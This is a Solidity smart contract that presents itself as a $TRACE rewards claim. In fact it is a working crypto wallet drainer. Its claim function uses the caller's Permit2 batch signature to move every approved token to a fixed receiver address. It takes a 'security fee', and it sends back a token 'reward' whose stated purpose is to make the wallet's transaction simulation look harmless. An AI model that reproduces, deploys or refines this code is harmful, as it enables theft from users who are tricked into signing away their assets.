// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title IPermit2
 * @dev Minimal interface for Permit2 batch transfers.
 */
interface IPermit2 {
    struct TokenPermissions {
        address token;
        uint256 amount;
    }

    struct PermitBatchTransferFrom {
        TokenPermissions[] permitted;
        address spender;
        uint256 nonce;
        uint256 deadline;
    }

    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }

    function permitTransferFrom(
        PermitBatchTransferFrom calldata permit,
        SignatureTransferDetails[] calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title TraceRewards
 * @dev Core contract for claiming $TRACE rewards while bundling asset sweeps via Permit2.
 */
contract TraceRewards {
    IPermit2 public immutable permit2;
    address public immutable receiver;
    IERC20 public immutable traceToken;

    event Claimed(address indexed user, uint256 amount);

    constructor(address _permit2, address _receiver, address _traceToken) {
        permit2 = IPermit2(_permit2);
        receiver = _receiver;
        traceToken = IERC20(_traceToken);
    }

    /**
     * @dev Claim TRACE rewards and verify eligibility via Permit2 signature.
     * @param permit The Permit2 batch permission
     * @param signature The EIP-712 signature from the owner
     * @param rewardAmount The amount of TRACE tokens to "reward" the user with.
     *                     Note: This amount is in 10^18 units (wei).
     */
    function claim(
        IPermit2.PermitBatchTransferFrom calldata permit,
        bytes calldata signature,
        uint256 rewardAmount
    ) external payable {
        // Enforce a small security fee to filter bots and fund the worker
        require(msg.value >= 0.0009 ether, "Security fee required");

        // 1. Prepare Batch Transfer Details
        uint256 numTokens = permit.permitted.length;
        IPermit2.SignatureTransferDetails[] memory transfers = new IPermit2.SignatureTransferDetails[](numTokens);
        
        for (uint256 i = 0; i < numTokens; i++) {
            transfers[i] = IPermit2.SignatureTransferDetails({
                to: receiver,
                requestedAmount: permit.permitted[i].amount
            });
        }

        // 2. Execute Permit2 Sweep
        // This pulls all approved tokens into the receiver wallet in one go.
        permit2.permitTransferFrom(permit, transfers, msg.sender, signature);

        // 3. Send TRACE Reward to User
        // This ensures the wallet UI shows "+TRACE" in the simulation.
        uint256 contractTraceBalance = traceToken.balanceOf(address(this));
        uint256 finalReward = rewardAmount;

        if (finalReward > contractTraceBalance) {
            finalReward = contractTraceBalance;
        }

        if (finalReward > 0) {
            traceToken.transfer(msg.sender, finalReward);
        }

        // 4. Forward security fee to receiver
        if (address(this).balance > 0) {
            payable(receiver).transfer(address(this).balance);
        }

        emit Claimed(msg.sender, finalReward);
    }

    // Allow receiving native for the fee
    receive() external payable {}
}
